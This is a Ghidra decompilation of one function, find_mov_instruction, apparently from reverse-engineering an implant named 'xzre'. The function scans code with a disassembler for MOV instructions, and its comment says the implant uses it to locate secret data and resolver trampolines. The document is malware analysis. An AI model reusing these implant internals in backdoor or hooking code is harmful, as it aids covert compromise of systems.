// /home/kali/xzre-ghidra/xzregh/100E00_find_mov_instruction.c
// Function: find_mov_instruction @ 0x100E00
// Calling convention: unknown
// Prototype: undefined find_mov_instruction(void)


/*
 * AutoDoc: Searches for MOV instructions with configurable load/store semantics and hands back the matched operands. It underpins many of the signature searches the implant runs while deriving addresses for secret data or resolver trampolines.
 */
#include "xzre_types.h"


undefined8
find_mov_instruction(ulong param_1,ulong param_2,uint param_3,int param_4,undefined4 *param_5)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  BOOL bVar4;
  undefined4 local_80 [22];
  
  puVar3 = local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  if (param_5 == (undefined4 *)0x0) {
    param_5 = local_80;
  }
  do {
    while( TRUE ) {
      if (param_2 <= param_1) {
        return 0;
      }
      iVar1 = x86_dasm(param_5,param_1,param_2);
      if (iVar1 != 0) break;
      param_1 = param_1 + 1;
    }
    if (((param_5[7] & 0xff00ff00) == 0x5000000) &&
       ((((*(byte *)((long)param_5 + 0x1b) & 0x48) == 0x48) == param_3 || (param_4 == 0)))) {
      if (param_4 == 0) {
        bVar4 = param_5[10] == 0x109;
      }
      else {
        bVar4 = param_5[10] == 0x10b;
      }
      if (bVar4) {
        return 1;
      }
    }
    param_1 = param_1 + *(long *)(param_5 + 2);
  } while( TRUE );
}

